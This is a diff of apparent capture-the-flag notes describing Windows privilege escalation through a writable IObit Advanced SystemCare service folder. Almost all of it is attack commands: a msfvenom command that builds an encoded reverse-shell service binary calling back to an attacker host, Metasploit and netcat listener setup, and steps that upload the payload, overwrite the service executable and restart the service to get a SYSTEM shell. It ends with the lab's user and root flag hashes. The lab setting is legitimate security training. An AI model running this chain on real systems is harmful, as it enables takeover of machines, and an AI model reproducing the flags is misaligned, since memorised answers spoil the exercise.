@@ -40,14 +40,25 @@ icacls "C:\Program Files (x86)\IObit\Advanced SystemCare"
 msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
 
 use exploit/multi/handler
-set payload/windows/x64/shell_reverse_tcp 
+set payload windows/x64/shell_reverse_tcp
 set lport lhost
 exploit -j 
 
-meterpreter > upload ~/ASCSerice.exe
+OR 
+
+nc -lvnp 4443
+
+meterpreter > upload ~/ASCService.exe
 shell
-C:// > copy ASCSerice.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCSerice.exe"
-C:// > sc AdvanceSystemCareServic9 stop
-C:// > sc AdvanceSystemCareServic9 start
+C:// > copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+C:// > sc stop AdvancedSystemCareService9 
+C:// > sc start AdvancedSystemCareService9 
 
 GOT ROOT SHELL
+
+cd c:\Users\Administrator\Desktop\
+type root.txt
+
+FLAG:
+User : b04763b6fcf51fcd7c13abc7db4fd365
+Root ; 9af5f314f57607c00fd09803a587db80
